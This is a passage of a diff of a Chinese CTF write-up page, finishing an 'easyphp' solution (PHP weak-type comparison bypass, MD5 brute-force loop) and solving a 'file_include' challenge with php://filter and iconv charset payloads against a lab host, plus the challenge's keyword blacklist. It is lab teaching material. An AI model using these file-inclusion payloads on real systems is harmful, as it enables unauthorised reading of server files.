+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(<span style="color:#ff5c57">$key1</span> <span style="color:#ff6ac1">&amp;&amp;</span> <span style="color:#ff5c57">$key2</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">include</span> <span style="color:#5af78e">&#34;Hgfks.php&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">echo</span> <span style="color:#5af78e">&#34;You&#39;re right&#34;</span><span style="color:#ff6ac1">.</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">echo</span> <span style="color:#ff5c57">$flag</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57"> Emmm...
+</span></span></span></code></pre></div><ul>
+<li>a，大于600万且字符串长度小于3，7e6</li>
+<li>b，MD5后六位是8b184b，53724</li>
+<li>c，包含m（非数字，但大于2022）和n（一个数组，数量为2，第一个元素为1），{&ldquo;m&rdquo;:&ldquo;2025a&rdquo;, &ldquo;n&rdquo;:[[], 0]}
+<ul>
+<li>c是数字</li>
+<li>m不能是纯数字</li>
+<li>m的数值要大于2022</li>
+<li>n必须是有两个内容的数组</li>
+<li>n数组里的第一个内容也是数组</li>
+<li>在n中能通过弱类型比较找到<code>DGGJ</code></li>
+<li>在执行<code>$d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);</code>时，在PHP8.0之前的版本中，用一个数字和一个字符串进行<code>==</code>比较时候，php会尝试把字符串转为数字，如果字符串不是以数字开头的，则会强制转换为数字<code>0</code>，<code>0==&quot;DGGJ&quot;</code>就会变成<code>0==0</code></li>
+</ul>
+</li>
+</ul>
+<p>其中b的结果只能用爆破脚本，因为MD5是不可逆的，只能从0开始一个个数字试</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">for</span> ( <span style="color:#ff5c57">$i</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff9f43">1</span>; <span style="color:#ff5c57">$i</span> <span style="color:#ff6ac1">&lt;</span> <span style="color:#ff9f43">999999999</span>; <span style="color:#ff5c57">$i</span><span style="color:#ff6ac1">++</span> ){
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> (<span style="color:#5af78e">&#39;8b184b&#39;</span> <span style="color:#ff6ac1">===</span> substr(md5(<span style="color:#ff5c57">$i</span>),<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">6</span>,<span style="color:#ff9f43">6</span>) ){
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">echo</span>(<span style="color:#ff5c57">$i</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
 </span></span></span></code></pre></div><p>payload
-<code>?a=7e6&amp;b=53724&amp;c={"m":"2025a", "n":[[], 0]}</code></p><h2 id=117-file_includephp本地包含lfi漏洞>1.17 file_include（php本地包含LFI漏洞）<a class=anchor href=#117-file_includephp%e6%9c%ac%e5%9c%b0%e5%8c%85%e5%90%ablfi%e6%bc%8f%e6%b4%9e>#</a></h2><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-PHP data-lang=PHP><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span><span style=color:#ff7b72;font-weight:700>&lt;?</span>php
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>highlight_file(<span style=color:#79c0ff;font-weight:700>__FILE__</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>    <span style=color:#ff7b72>include</span>(<span style=color:#a5d6ff>&#34;./check.php&#34;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>    <span style=color:#ff7b72>if</span>(isset(<span style=color:#79c0ff>$_GET</span>[<span style=color:#a5d6ff>&#39;filename&#39;</span>])){
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">5</span><span>        <span style=color:#79c0ff>$filename</span>  <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#79c0ff>$_GET</span>[<span style=color:#a5d6ff>&#39;filename&#39;</span>];
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">6</span><span>        <span style=color:#ff7b72>include</span>(<span style=color:#79c0ff>$filename</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">7</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">8</span><span><span style=color:#8b949e;font-weight:700;font-style:italic>?&gt;</span><span style=color:#f85149>
-</span></span></span></code></pre></div><ul><li><code>include("./check.php")</code>大概率是一个黑名单过滤器
+<code>?a=7e6&amp;b=53724&amp;c={&quot;m&quot;:&quot;2025a&quot;, &quot;n&quot;:[[], 0]}</code></p>
+<h2 id="117-file_includephp本地包含lfi漏洞">1.17 file_include（php本地包含LFI漏洞）<a class="anchor" href="#117-file_includephp%e6%9c%ac%e5%9c%b0%e5%8c%85%e5%90%ablfi%e6%bc%8f%e6%b4%9e">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#ff9f43">__FILE__</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">include</span>(<span style="color:#5af78e">&#34;./check.php&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span>(isset(<span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#39;filename&#39;</span>])){
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$filename</span>  <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#39;filename&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">include</span>(<span style="color:#ff5c57">$filename</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span></code></pre></div><ul>
+<li><code>include(&quot;./check.php&quot;)</code>大概率是一个黑名单过滤器
 构造payload：<code>?filename=php://filter/read=convert.base64-encode/resource=flag.php</code>
-但提示：do not hack!</li></ul><p>尝试各种伪协议数据流过滤器最终采用convert.iconv字符集转换，使用bp进行爆破，记得取消Payload encoding，不需要对内容进行url编码，注意这里要规范格式，在第九行按两次回车，确保光标闪烁在第11行，开始爆破
+但提示：do not hack!</li>
+</ul>
+<p>尝试各种伪协议数据流过滤器最终采用convert.iconv字符集转换，使用bp进行爆破，记得取消Payload encoding，不需要对内容进行url编码，注意这里要规范格式，在第九行按两次回车，确保光标闪烁在第11行，开始爆破
 <code>GET http://61.147.171.103:60271/?filename=php://filter/convert.iconv.UTF-8.GBK/resource=flag.php HTTP/1.1</code>
 结果<code>UTF-7</code>、<code>UTF-32</code>，<code>UTF-8*</code>、<code>UTF-32*</code>这两对长度最大
 <code>http://61.147.171.103:60271/?filename=php://filter/convert.iconv.UTF-7.UTF-32/resource=flag.php</code>
-<code>http://61.147.171.103:60271/?filename=php://filter/convert.iconv.UTF-8*.UTF-32/resource=flag.php</code></p><p>最后复查<code>check.php</code></p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>��<span style=color:#ff7b72;font-weight:700>&lt;</span>�<span style=color:#ff7b72;font-weight:700>?</span>php <span style=color:#ff7b72>if</span>(<span style=color:#79c0ff>$_GET</span>[<span style=color:#a5d6ff>&#34;filename&#34;</span>]){ <span style=color:#79c0ff>$preg_match_username</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#39;return preg_match(&#34;/base|be|encode|print|zlib|quoted|write|rot13|read|string/i&#34;, $_GET[&#34;filename&#34;]);&#39;</span>; <span style=color:#ff7b72>if</span> (<span style=color:#ff7b72>eval</span>(<span style=color:#79c0ff>$preg_match_username</span>)) { <span style=color:#ff7b72>die</span>(<span style=color:#a5d6ff>&#34;do not hack!&#34;</span>); } }</span></span></code></pre></div><ul><li><code>eval()</code>函数立即执行<code>$preg_match_username</code></li><li>其使用<code>preg_match</code>检查通过<code>filename</code>传入的字符串，如果匹配到如上内容的关键词(<code>/i</code>不区分大小写)，就会执行<code>die("do not hack!")</code></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div></div><div></div></div><div class="flex flex-wrap justify-between"><span><a href=/docs/cybersecurity/ctf/ class="flex align-center"><img src=/icons/backward.svg class=book-icon alt=Backward>
-<span>CTF</span>
-</a></span><span><a href=/docs/papers/ class="flex align-center"><span>论文</span>
-<img src=/icons/forward.svg class=book-icon alt=Forward></a></span></div><div class=book-comments></div><style>.minimal-round-btn{position:fixed;right:4px;bottom:4px;z-index:9999;width:45px;height:45px;display:flex;align-items:center;justify-content:center;opacity:.2;transition:opacity .3s ease,transform .3s ease}.minimal-round-btn img{width:100%;height:100%;border-radius:50%;object-fit:cover;border:1.5px solid #30363d;background:#0d1117;box-shadow:0 4px 10px rgba(0,0,0,.5)}.minimal-round-btn:hover{opacity:1;transform:scale(1.1)}.minimal-round-btn:hover img{border-color:#58a6ff}@media screen and (max-width:768px){.minimal-round-btn{display:none}}</style><a href=/posts/ class=minimal-round-btn><img src=/donk.png alt=随笔></a><footer class=custom-footer><span class=status-dot></span>
-<span>2026 vnccer <a href=https://creativecommons.org/licenses/by/4.0/ target=_blank class=license-link>CC BY 4.0</a></span></footer><script>function toggleSidebar(){const e=document.querySelector("main.container");e.classList.toggle("sidebar-collapsed");const t=e.classList.contains("sidebar-collapsed");localStorage.setItem("sidebar-collapsed",t)}document.addEventListener("DOMContentLoaded",()=>{const o=document.querySelector("main.container"),i=document.documentElement;localStorage.getItem("sidebar-collapsed")==="true"&&o.classList.add("sidebar-collapsed"),setTimeout(()=>{i.classList.remove("sidebar-collapsed-init")},10);const e=document.querySelectorAll(".book-toc #TableOfContents a"),n=document.querySelectorAll("main article.markdown h1[id], main article.markdown h2[id], main article.markdown h3[id], main article.markdown h4[id]");if(e.length===0||n.length===0)return;let t=!1,s;const a=()=>{e.forEach(n=>{n.addEventListener("click",function(){t=!0,clearTimeout(s),e.forEach(e=>e.classList.remove("active")),this.classList.add("active"),s=setTimeout(()=>{t=!1},800)})})},r=()=>{const s=new IntersectionObserver(n=>{if(t)return;const s=n.filter(e=>e.isIntersecting);if(s.length>0){const n=s[s.length-1],o=n.target.getAttribute("id"),t=document.querySelector(`.book-toc #TableOfContents a[href="#${o}"]`);t&&(e.forEach(e=>e.classList.remove("active")),t.classList.add("active"))}},{root:null,rootMargin:"-5% 0px -80% 0px",threshold:0});n.forEach(e=>s.observe(e))};a(),r()})</script><a href=/docs/cybersecurity/ctf/easy/ class=minimal-back-btn title><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg></a><div id=cheat-video-modal><div class=close-video title=关闭>×</div><video id=cheat-video-player controls preload=auto playsinline>
-<source src=/video/cheat.mp4 type=video/mp4>您的浏览器不支持视频标签。</video></div><script>document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("cheat-video-modal"),t=document.getElementById("cheat-video-player"),n=document.querySelector(".close-video"),o=document.querySelectorAll('a[href="#cheat"]');o.forEach(n=>{n.addEventListener("click",function(n){n.preventDefault(),e.classList.add("active"),t.volume=.5,t.load();let s=t.play();s!==0[0]&&s.then(e=>{console.log("🚀 彩蛋视频带声音播放成功！")}).catch(e=>{console.error("❌ 浏览器策略拦截:",e)})})});const s=()=>{e.classList.remove("active"),t.pause(),t.currentTime=0};n&&n.addEventListener("click",s),e&&e.addEventListener("click",function(t){t.target===e&&s()})})</script><script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#一低难度>一、低难度</a><ul><li><a href=#11-training-www-robotsrobots>1.1 Training-WWW-Robots（Robots）</a></li><li><a href=#12-php2indexphps>1.2 PHP2（index.phps）</a></li><li><a href=#13-unserialize3反序列化漏洞>1.3 unserialize3（反序列化漏洞）</a></li><li><a href=#14-ics-06字典爆破>1.4 ics-06（字典爆破）</a></li><li><a href=#15-get_postgetpost>1.5 get_post（GET/POST）</a></li><li><a href=#16-backup目录扫描>1.6 backup（目录扫描）</a></li><li><a href=#17-cookie>1.7 cookie</a></li><li><a href=#18-disabled_buttonhtml源码修改>1.8 disabled_button（HTML源码修改）</a></li><li><a href=#19-weak_auth字典爆破>1.9 weak_auth（字典爆破）</a></li><li><a href=#110-simple_phpphp源码审计>1.10 simple_php（php源码审计）</a></li><li><a href=#111-baby_web重定向>1.11 baby_web(重定向)</a></li><li><a href=#112-ingetsql注入>1.12 inget(sql注入)</a></li><li><a href=#113-easyupload文件上传>1.13 easyupload(文件上传)</a><ul><li><a href=#1131-一般思路>1.13.1 一般思路</a></li><li><a href=#1132-userini思路>1.13.2 <code>.user.ini</code>思路</a></li></ul></li><li><a href=#114-file-include文件包含伪协议>1.14 file include(文件包含伪协议)</a><ul><li><a href=#1141-源码分析>1.14.1 源码分析</a></li><li><a href=#1142-php的filter伪协议>1.14.2 PHP的<code>filter</code>伪协议</a></li></ul></li><li><a href=#115-fileclude文件包含伪协议>1.15 fileclude(文件包含伪协议)</a></li><li><a href=#116-easyphp>1.16 easyphp</a></li><li><a href=#117-file_includephp本地包含lfi漏洞>1.17 file_include（php本地包含LFI漏洞）</a></li></ul></li></ul></nav></div></aside></main></body></html>
+<code>http://61.147.171.103:60271/?filename=php://filter/convert.iconv.UTF-8*.UTF-32/resource=flag.php</code></p>
+<p>最后复查<code>check.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>��<span style="color:#ff6ac1">&lt;</span>�<span style="color:#ff6ac1">?</span>php <span style="color:#ff6ac1">if</span>(<span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#34;filename&#34;</span>]){ <span style="color:#ff5c57">$preg_match_username</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;return preg_match(&#34;/base|be|encode|print|zlib|quoted|write|rot13|read|string/i&#34;, $_GET[&#34;filename&#34;]);&#39;</span>; <span style="color:#ff6ac1">if</span> (<span style="color:#ff6ac1">eval</span>(<span style="color:#ff5c57">$preg_match_username</span>)) { <span style="color:#ff6ac1">die</span>(<span style="color:#5af78e">&#34;do not hack!&#34;</span>); } }</span></span></code></pre></div><ul>
+<li><code>eval()</code>函数立即执行<code>$preg_match_username</code></li>
+<li>其使用<code>preg_match</code>检查通过<code>filename</code>传入的字符串，如果匹配到如上内容的关键词(<code>/i</code>不区分大小写)，就会执行<code>die(&quot;do not hack!&quot;)</code></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+<a class="flex align-center" href="https://github.com/vnccer/vnccer.github.io/commit/9639a446b40210bd927138fe85381c37d7b7df8f" title='Last modified by vnccer | March 12, 2026' target="_blank" rel="noopener">
+    <img src="/icons/calendar.svg" class="book-icon" alt="Calendar" />
+    <span>March 12, 2026</span>
+  </a>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/cybersecurity/vulnhub/medium/vulnhub-Empire_lupinone/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Empire lupinone</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/papers/" class="flex align-center">
+        <span>论文</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+  <div class="book-copyright flex justify-center">
+    <small>vnccer - <a href="https://creativecommons.org/licenses/by/4.0/legalcode">© CC BY 4.0</a></small>
+  </div>
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#一低难度">一、低难度</a>
+      <ul>
+        <li><a href="#11-training-www-robotsrobots">1.1 Training-WWW-Robots（Robots）</a></li>
+        <li><a href="#12-php2indexphps">1.2 PHP2（index.phps）</a></li>
+        <li><a href="#13-unserialize3反序列化漏洞">1.3 unserialize3（反序列化漏洞）</a></li>
+        <li><a href="#14-ics-06字典爆破">1.4 ics-06（字典爆破）</a></li>
+        <li><a href="#15-get_postgetpost">1.5 get_post（GET/POST）</a></li>
+        <li><a href="#16-backup目录扫描">1.6 backup（目录扫描）</a></li>
+        <li><a href="#17-cookie">1.7 cookie</a></li>
+        <li><a href="#18-disabled_buttonhtml源码修改">1.8 disabled_button（HTML源码修改）</a></li>
+        <li><a href="#19-weak_auth字典爆破">1.9 weak_auth（字典爆破）</a></li>
+        <li><a href="#110-simple_phpphp源码审计">1.10 simple_php（php源码审计）</a></li>
+        <li><a href="#111-baby_web重定向">1.11 baby_web(重定向)</a></li>
+        <li><a href="#112-ingetsql注入">1.12 inget(sql注入)</a></li>
+        <li><a href="#113-easyupload文件上传">1.13 easyupload(文件上传)</a>
+          <ul>
+            <li><a href="#1131-一般思路">1.13.1 一般思路</a></li>
+            <li><a href="#1132-userini思路">1.13.2 <code>.user.ini</code>思路</a></li>
+          </ul>
+        </li>
+        <li><a href="#114-file-include文件包含伪协议">1.14 file include(文件包含伪协议)</a>
+          <ul>
+            <li><a href="#1141-源码分析">1.14.1 源码分析</a></li>
+            <li><a href="#1142-php的filter伪协议">1.14.2 PHP的<code>filter</code>伪协议</a></li>
+          </ul>
+        </li>
+        <li><a href="#115-fileclude文件包含伪协议">1.15 fileclude(文件包含伪协议)</a></li>
+        <li><a href="#116-easyphp">1.16 easyphp</a></li>
+        <li><a href="#117-file_includephp本地包含lfi漏洞">1.17 file_include（php本地包含LFI漏洞）</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
